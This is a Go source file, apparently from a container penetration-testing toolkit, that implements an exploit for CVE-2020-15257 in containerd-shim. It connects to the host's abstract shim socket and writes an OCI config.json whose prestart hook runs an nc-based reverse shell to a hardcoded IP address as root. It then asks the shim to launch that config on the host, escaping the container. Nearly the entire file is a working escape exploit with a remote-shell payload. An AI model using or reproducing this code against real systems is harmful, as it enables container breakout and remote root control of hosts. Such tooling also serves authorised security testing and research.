package docker

import (
	"context"
	"fmt"
	"github.com/Xyntax/CDK/pkg/util"
	shimapi "github.com/containerd/containerd/runtime/v1/shim/v1"
	"github.com/containerd/ttrpc"
	"io/ioutil"
	"log"
	"net"
	"strings"
)

/*
[][]byte sockets
err == nil  means have vulnerable sockets
*/

var configJson = `
{
  "ociVersion": "1.0.1-dev",
  "process": {
    "terminal": true,
    "user": {
      "uid": 0,
      "gid": 0
    },
    "args": [
      "/bin/bash"
    ],
    "env": [
      "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
      "HOSTNAME=123456789123",
      "TERM=xterm"
    ],
    "cwd": "/"
  },
  "root": {
   "path": "/tmp"
  },
  "hostname": "123456789123",
  "hooks": {
        "prestart": [
            {
                "path": "/bin/bash",
                "env":  ["PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"],
                "args": ["bash", "-c", "nc 10.227.74.121 8777 | /bin/bash | nc 10.227.74.121 8888"]
            }
        ]
    },
  "linux": {
    "resources": {
      "devices": [
        {
          "allow": false,
          "access": "rwm"
        }
      ],
      "memory": {
        "disableOOMKiller": false
      },
      "cpu": {
        "shares": 0
      },
      "blockIO": {
        "weight": 0
      }
    },
    "namespaces": [
      {
        "type": "mount"
      },
      {
        "type": "network"
      },
      {
        "type": "uts"
      },
      {
        "type": "ipc"
      }
    ]
  }
}
`

func exp(sock, rhost, rport string) bool {
	sock = strings.Replace(sock, "@", "", -1)
	conn, err := net.Dial("unix", "\x00"+sock)
	if err != nil {
		log.Println(err)
		return false
	}

	client := ttrpc.NewClient(conn)
	shimClient := shimapi.NewShimClient(client)
	ctx := context.Background()

	// config.json file /run/containerd/io.containerd.runtime.v1.linux/moby/<id>/config.json
	// rootfs path /var/lib/docker/overlay2/<id>/merged

	localBundlePath := "/tmp"
	dockerAbsPath := GetDockerAbsPath() + "/merged" + localBundlePath
	fmt.Println(GetDockerAbsPath())
	configJson = strings.Replace(configJson, "$RHOST$", rhost, -1)
	configJson = strings.Replace(configJson, "$RPORT$", rport, -1)

	err = ioutil.WriteFile(localBundlePath+"/config.json", []byte(configJson), 0666)
	if err != nil {
		log.Println("failed to write file.", err)
		return false
	}

	var M = shimapi.CreateTaskRequest{
		ID:       util.RandString(10), // needs to be different in each exploit
		Bundle:   dockerAbsPath,       // use container abspath so runc can find config.json
		Terminal: true,
		Stdin:    "/dev/null",
		Stdout:   "/root/test",
		Stderr:   "/dev/null",
	}

	info, err := shimClient.Create(ctx, &M)
	if err != nil {
		log.Println("rpc error:", err)
		return false
	}
	log.Println("shim pid:", info.Pid)
	return true
}

func mainContainerdPwn(rhost string, rport string) {
	matchset := make(map[string]bool)
	socks, err := GetShimSockets()
	if err != nil {
		log.Fatalln(err)
	}
	for i, b := range socks {
		if i > 0 {
			break
		}
		sockname := string(b)
		if _, ok := matchset[sockname]; ok {
			continue
		}
		log.Println("try socket:", sockname)
		matchset[sockname] = true
		if exp(sockname, rhost, rport) {
			break
		}
	}
	return
}
func DockerCVE_2020_15257() {
	mainContainerdPwn("10.227.74.121", "8777")
}
